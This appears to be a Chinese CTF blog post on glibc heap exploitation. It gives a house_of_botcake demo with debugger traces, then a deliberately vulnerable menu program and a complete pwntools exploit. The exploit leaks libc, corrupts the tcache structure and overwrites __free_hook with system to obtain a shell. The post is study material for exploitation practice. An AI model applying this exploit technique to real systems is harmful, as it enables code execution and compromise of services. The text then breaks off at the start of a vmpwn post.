<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house_of_botcake 是针对 glibc2.29 对 tcache double free 做出限制以后提出的利用方法&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们希望 malloc 到的地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc 7 个 chunk 以便稍后填满 tcache&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): prev=%p. 待会用\n&quot;</span>, prev); </span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再 malloc(0x100): a=%p. 作为攻击的 chunk\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;最后 malloc(0x10) 防止与 top chunk 合并\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来构造 chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第一步: 填满 tcache 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第二步: free 掉 chunk a，放入 unsorted bin 中&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第三步: 释放掉 chunk prev 因为后面是一个 free chunk，所以他会与 chunk a 合并&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第四步: 这时候已经没有指向 chunk a 的指针了，从 tcache 中取出一个，然后再次 free(a) 就把 chunk a 加入到了 tcache 中，造成了 double free \n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个 0x120 会从 unsorted bin 中分割出来，也就控制了前面已经合并的那个 chunk a 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;把 chunk a 的 next 指针给改为前面声明的 stack_var 的地址&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个就能申请到 stack_var 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 在：%p\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ul>
<li>从31行开始，这里free了7个chunk是为了填满tcache</li>
<li>再free(a)，使a放入unsortedbin中，再free(prev)，使再unsortedbin中的chunk a和chunk prev合并，实现chunk_overlapping，以至于此时bins中并没有chunk a的信息（chunk a的prev_size在0x555555603ad0）如下：</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x5555556038c0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0                      </span><br></pre></td></tr></table></figure>

<ul>
<li>执行了38行的malloc(0x100)，使tcachebins中腾出了一个位置</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  6]: 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了39行过后，chunk a就被放入了tcachebins中，这就实现了<strong>double_free</strong>，一个在tcachebins中一个在unsortedbins</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins      <span class="comment">#|这个|#chunk a_mem_ptr</span></span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了42行后，修改了chunk a的next指针此时chunk a的情况：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/48gx 0x555555603ad0</span><br><span class="line">0x555555603ad0: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x555555603ae0: 0x00007fffffffe380      0x0000555555603010</span><br><span class="line">0x555555603af0: 0x0000000000000000      0x00000000000000f1</span><br><span class="line">0x555555603b00: 0x00007ffff7dcdca0      0x00007ffff7dcdca0</span><br><span class="line">0x555555603b10: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>同样bins也发生了变化，此时的bins:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x7fffffffe380 ◂— 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555603af0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555603af0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure>

<p>最终，我们在连续申请两个chunk就能得到<code>&amp;stack_var</code>的哪个chunk。</p>
<blockquote>
<p>实战中，我们的stacke_var可以是任意地址</p>
</blockquote>
<h4 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h4><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个<strong>double free</strong>（若还有修改功能到这里我们就可以做我们想做的事了）</p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上</p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="tcache-corruption-dup-—-libc-2-27"><a href="#tcache-corruption-dup-—-libc-2-27" class="headerlink" title="tcache_corruption+dup — libc 2.27"></a>tcache_corruption+dup — libc 2.27</h3><p><a href="https://faraz.faith/2019-10-20-secconctf-2019-one/">one</a></p>
<h3 id="tcache-corruption-—-libc-2-29"><a href="#tcache-corruption-—-libc-2-29" class="headerlink" title="tcache_corruption — libc 2.29"></a>tcache_corruption — libc 2.29</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 22</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* nodes[LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inital</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	alarm(<span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tcache Corruption - Two&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2. delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_n</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read(STDIN_FILENO, buf, size);</span><br><span class="line">	<span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_int</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read_n(buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>);</span><br><span class="line">	buf[result] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size, index = <span class="number">-1</span>, i, result;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!nodes[i]) &#123;</span><br><span class="line">			index = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (index == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of space!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">	size = get_int();</span><br><span class="line">	<span class="keyword">if</span> (size &gt; <span class="number">0x400</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nodes[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">	result = read_n(nodes[index], size);</span><br><span class="line">	<span class="keyword">if</span> (nodes[index][result - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">		nodes[index][result - <span class="number">1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">	index = get_int();</span><br><span class="line">	<span class="keyword">if</span> (index &gt;= LENGTH || !nodes[index]) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(nodes[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nodes[i]) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Index %d: %s\n&quot;</span>, i, nodes[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	inital();</span><br><span class="line">	welcome();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> choice = get_int();</span><br><span class="line">		<span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			add();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			delete();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			show();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o pwn1 pwn1.c  glibc-2.29 ubuntu18.04</span></span><br></pre></td></tr></table></figure>



<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Your choice: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="comment">##get </span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">heap = data - <span class="number">0x260</span></span><br><span class="line">lg(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#9-15</span></span><br><span class="line"><span class="comment">##此时tcachebins为空，当再次申请chunk会将fastbins的chunk放入tcachebins中</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(heap+<span class="number">0x10</span>))<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#18</span></span><br><span class="line"><span class="comment">##设置tcache_perthread_struct chunk的size对应的tcachebins为0xff，即让系统认为tcachebins中这个size处，已经满了</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#19</span></span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data =  uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;main_arena+96&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">##malloc出来tcache_perthread_struct chunk使用去修改tcache_entry指针实现任意malloc</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>))<span class="comment">#20</span></span><br><span class="line"><span class="comment">##这段代码就是改tcachebins的0x20处的next指针指向__free_hook</span></span><br><span class="line"><span class="comment">##申请出上面这个0x20大小的chunk，改__free_hook为system</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#21</span></span><br><span class="line"><span class="comment">##b&#x27;/bin/sh\x00&#x27;覆盖了libc_base+libc.sym[&#x27;__free_hook&#x27;]-8，system覆盖了__free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<ol>
<li>tcache中的偏移，与存放chunk_size的大小</li>
</ol>
<p>疑问一：为什么这里<code>payload = b&#39;\x00&#39;*0x23+b&#39;\xff&#39;</code></p>
<p>在此处pwndbg中，tcache_prethread_struct的chunk内存，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x00000000ff000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这一块内存记录的是tcachebins中对应size的chunk的数量，在0xff前面有0x23个\x00,它们记录了从0x10 - 0x240size的chunk，0xff的位置记录的是0x250大小的chunk,由于0xff导致0x250[-1]，以至于系统认为此处的chunk已满</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  0]: 0x10000000000</span><br><span class="line">0x250 [ -1]: 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关于这个前0x40的内存，这里可以参考源码：</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//64 = 0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//后面的就是tcache_entry,即每个tcachebins中记录的chunk_memptr</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>



<p>疑问二：<code>b&#39;\x00&#39;*0x40+p64(libc_base+libc.sym[&#39;__free_hook&#39;]-8)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000101</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这些应该是记录tcachebins中每个size对应chunk的数量</span></span><br><span class="line"><span class="comment">#从这里开始往下应该是记录了每个size的chunk_memptr,最小的是0x20</span></span><br><span class="line">0x555555606050: 0x00007ffff7fc65a0      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p>ctf-wiki，<a href="https://nightrainy.github.io/">知世</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>vmpwn</title>
    <url>/2025/05/02/vmpwn/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>vmpwn常见设计</p>
<ul>
<li>初始化分配模拟寄存器空间</li>
<li>初始化模拟栈空间</li>
